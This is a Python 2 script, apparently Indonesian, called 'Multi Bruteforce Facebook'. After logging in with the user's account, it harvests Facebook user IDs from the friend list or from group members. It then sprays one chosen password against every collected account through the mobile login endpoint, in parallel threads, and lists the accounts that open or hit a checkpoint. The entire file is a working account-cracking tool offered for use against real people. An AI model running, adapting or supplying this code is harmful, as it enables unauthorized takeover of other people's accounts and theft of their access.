import platform,os,sys
def cetak(x,e=0):
	w = 'mhkbpcP'
	for i in w:
		j = w.index(i)
		x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
	x += '\033[0m'
	x = x.replace('!0','\033[0m')
	if e != 0:
		sys.stdout.write(x)
	else:
		sys.stdout.write(x+'\n')
if platform.python_version().split('.')[0] != '2':
	cetak('!m[!] Kamu menggunakan python versi %s silahkan menggunakan versi 2.x.x'%v().split(' ')[0])
	sys.exit()
import cookielib,re,urllib2,urllib,threading
try:
  import mechanize
except ImportError:
	cetak('!m[!] SepertiNya Module !cmechanize!m belum di install...\n!h[!] pip2 install mechanize')
	sys.exit()
br = 0
log = 0
id_bteman = []
id_bgroup = []
fid_bteman = []
fid_bgroup = []
class mt(threading.Thread):
	def __init__(self,i,p):
		threading.Thread.__init__(self)
		self.id = i
		self.a = 0
		self.p = p
	def update(self):
		return self.a,self.id
	def run(self):
		try:
			data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
		except KeyboardInterrupt:
			sys.exit()
		except:
			self.a = 4
			sys.exit()
		if 'm_sess' in data.url or 'save-device' in data.url:
			self.a = 1
		elif 'checkpoint' in data.url:
			self.a = 2
		else:
			self.a = 3
def crack(d):
	while 1:
		s = inputD('[?] Sandi')
		if len(s) < 6:
			cetak('!m[!] Jumlah huruf minimal !k6')
		else:
			break
	return crack0(d,s)
def tampilhasil(akun,sandi,data):
	cekpoint = []
	salah = 0
	berhasil = []
	for i in akun:
		st,id = i
		if st == 1:
			berhasil.append(id)
		elif st == 2:
			cekpoint.append(id)
		elif st == 3:
			salah += 1
	cetak('!h[*] Berhasil !c%d'%len(berhasil))
	if len(berhasil) != 0:
		for i in berhasil:
			cetak('!h### !p%s !m=> !b[!k%s!b]'%(i,sandi))
	cetak('!k[*] Cekpoint !c%d'%len(cekpoint))
	if len(cekpoint) != 0:
		for i in cekpoint:
			cetak('!k### !p%s !m=> !b[!k%s!b]'%(i,sandi))
	cetak('!m[*] Gagal    !c'+str(salah))
	i = inputD('[?] Tidak Puas dengan Hasil,Mau coba lagi (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(data)
	else:
		return menu()
def crack0(data,sandi):
	akun = []
	cetak('!h[*] MengCrack !k%d Akun !hdengan sandi !m[!k%s!m]'%(len(data),sandi))
	cetak('!h[*] Cracking  !k0!m%',1)
	sys.stdout.flush()
	jml0,jml1 = 0,0
	th = []
	for i in data:
		i = i.replace(' ','')
		i = i.replace('\n','')
		if len(i) != 0:th.append(mt(i,sandi))
		jml1 += 1
	for i in th:
		i.daemon = True
		try:i.start()
		except KeyboardInterrupt:exit()
	h_error = []
	error = 0
	while 1:
		try:
			for i in th:
				status,id = i.update()
				if status != 0:
					cetak('\r!h[*] Cracking  !k%d!m%s!0'%(int(float((float(jml0)/float(jml1))*100)),'%'),1)
					sys.stdout.flush()
					del(th[th.index(i)])
					if status == 4:
						h_error.append(id)
						if h_error.count(id) == 3:
							pass
						else:
							th.append(mt(id,sandi))
							th[len(th)-1].daemon = True
							th[len(th)-1].start()
					else:
						jml0 += 1
						akun.append((status,id))
		except KeyboardInterrupt:
			sys.exit()
		try:
			if threading.activeCount() == 1:break
		except KeyboardInterrupt:
			keluar()
	cetak('\r!h[*] Cracking  !k100!m%      ')
	tampilhasil(akun,sandi,data)
def install_browser():
	global br
	br = mechanize.Browser()
	br.set_handle_robots(False)
	br.set_handle_equiv(True)
	br.set_handle_referer(True)
	br.set_cookiejar(cookielib.LWPCookieJar())
	br.set_handle_redirect(True)
	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
	br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
def bacaData():
	global fid_bgroup,fid_bteman
	try:
		fid_bgroup = open(os.sys.path[0]+'/MBFgroup.txt','r').readlines()
	except:pass
	try:
		fid_bteman = open(os.sys.path[0]+'/MBFteman.txt','r').readlines()
	except:pass
def simpan():
	if len(id_bgroup) != 0:
		cetak('!h[*] Menyimpan hasil dari Group')
		try:
			open(os.sys.path[0]+'/MBFgroup.txt','w').write('\n'.join(id_bgroup))
			cetak('!h[!] Berhasil meyimpan !cMBFgroup.txt')
		except:
			cetak('!m[!] Gagal meyimpan')
	if len(id_bteman) != 0:
		cetak('!h[*] Menyimpan hasil daftar Teman...')
		try:
			open(os.sys.path[0]+'/MBFteman.txt','w').write('\n'.join(id_bteman))
			cetak('!h[!] Berhasil meyimpan !cMBFteman.txt')
		except:
			cetak('!m[!] Gagal meyimpan')
def keluar():
	simpan()
	cetak('!m[!] Keluar')
	sys.exit()
def inputD(x,v=0):
	while 1:
		try:
			a = raw_input('\x1b[32;1m%s\x1b[31;1m:\x1b[33;1m'%x)
		except:
			cetak('\n!m[!] Batal')
			keluar()
		if v:
			if a.upper() in v:
				break
			else:
				cetak('!m[!] Masukan Opsinya Bro...')
				continue
		else:
			if len(a) == 0:
				cetak('!m[!] Masukan dengan benar')
				continue
			else:
				break
	return a
def inputM(x,d):
	while 1:
		try:
			i = int(inputD(x))
		except:
			cetak('!m[!] Pilihan tidak ada')
			continue
		if i in d:
			break
		else:
			cetak('!m[!] Pilihan tidak ada')
	return i
def lanjutG():
	global fid_bgroup
	if len(fid_bgroup) != 0:
		i = inputD('[?] Riset Hasil Id Group/lanjutkan (r/l)',['R','L'])
		if i.upper() == 'L':
			return crack(fid_bgroup)
		else:
			os.remove(os.sys.path[0]+'/MBFgroup.txt')
			fid_bgroup = []
	return 0
def lanjutT():
	global fid_bteman
	if len(fid_bteman) != 0:
		i = inputD('[?] Riset Hasil Id Teman/lanjutkan (r/l)',['R','L'])
		if i.upper() == 'L':
			return crack(fid_bteman)
		else:
			os.remove(os.sys.path[0]+'/MBFteman.txt')
			fid_bteman = []
	return 0
def buka(d):
	try:
		x = br.open(d)
		br._factory.is_html = True
		x = x.read()
	except:
		cetak('\r!m[!] Gagal membuka !p'+str(d))
		keluar()
	if '<link rel="redirect" href="' in x:
		return buka(br.find_link().url)
	else:
		return x
def login():
	global log
	us = inputD('[?] Email/HP')
	pa = inputD('[?] Kata Sandi')
	cetak('!h[*] Sedang Login....')
	buka('https://m.facebook.com')
	br.select_form(nr=0)
	br.form['email']=us
	br.form['pass']=pa
	br.submit()
	url = br.geturl()
	if 'save-device' in url or 'm_sess' in url:
		buka('https://mobile.facebook.com/home.php')
		nama = br.find_link(url_regex='logout.php').text
		nama = re.findall(r'\((.*a?)\)',nama)[0]
		cetak('!h[*] Selamat datang !k%s'%nama)
		cetak('!h[*] Semoga ini adalah hari keberuntungan mu...')
		log = 1
	elif 'checkpoint' in url:
		cetak('!m[!] Akun kena checkpoint\n!k[!]Coba Login dengan opera mini')
		keluar()
	else:
		cetak('!m[!] Login Gagal')
def idgroup():
	if log != 1:
		cetak('!h[*] Login !bFB!h dulu bos...')
		login()
		if log == 0:
			keluar()
	next = saring_id_group0()
	while 1:
		saring_id_group1(buka(next))
		try:
			next = br.find_link(url_regex='/browse/group/members/').url
		except:
			cetak('!m[!] Hanya Bisa Mengambil !h %d id'%len(id_bgroup))
			break
	simpan()
	i = inputD('[?] Langsung Crack (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(id_bgroup)
	else:
		return menu()
def saring_id_teman(r):
	for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
		id_bteman.append(i)
def idteman():
	if log != 1:
		cetak('!h[*] Login !bFB !hdulu bos...')
		login()
		if log == 0:
			keluar()
	cetak('!h[*] Sedang mengumpulkan id teman...')
	buka('https://m.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=mbasic_bookmark&ref_page=XMenuController')
	jumlah = br.find_link(url_regex='/friends/center/friends/').text
	jumlah = re.findall(r'\((.*a?)\)',jumlah)[0]
	cetak('!h[*] Mengambil !p%s !hid teman'%jumlah) 
	saring_id_teman(buka('https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
	try:
		next = br.find_link(url_regex='friends_center_main').url
	except:
		if len(id_teman) != 0:
			cetak('!m[!] Hanya dapat mengambil !p%d id'%len(id_bteman))
		else:
			cetak('!m[!] Batal')
			keluar()
	while 1:
		saring_id_teman(buka(next))
		cetak('\r!h[*] !p%s !hid terambil...'%len(id_bteman),1)
		sys.stdout.flush()
		try:
			next = br.find_link(url_regex='friends_center_main').url
		except:
			cetak('\n!m[!] Hanya dapat mengambil !p%d id'%len(id_bteman))
			break
	simpan()
	i = inputD('[?] Langsung Crack (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(id_bteman)
	else:
		return menu()
def menu():
	cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n       !h/  \  \          !b'\n       !h\_  \_ \_   !k___!mMBF !c2.0!k___\n\n !m* !bMULTI BRUTEFORCE FACEBOOK\n !m* !cPIRMANSX\n !m* !phttps://github.com/pirmansx\n !m* !phttps://facebook.com/groups/164201767529837\n !m* !phttps://pirmansx.waper.com\n!k.======================.\n|!h  AMBIL !mID!h DARI.....  !k|\n'======================'\n!k#!p1 !hDAFTAR TEMAN\n!k#!p2 !hANGGOTA GROUP\n!k#!p3 !mKELUAR...")
	i = inputM('[?] PILIH',[1,2,3])
	if i == 2:
		lanjutG()
		idgroup()
	elif i == 1:
		lanjutT()
		idteman()
	elif i == 3:
		keluar()
bacaData()
install_browser()
menu()
#
#
#
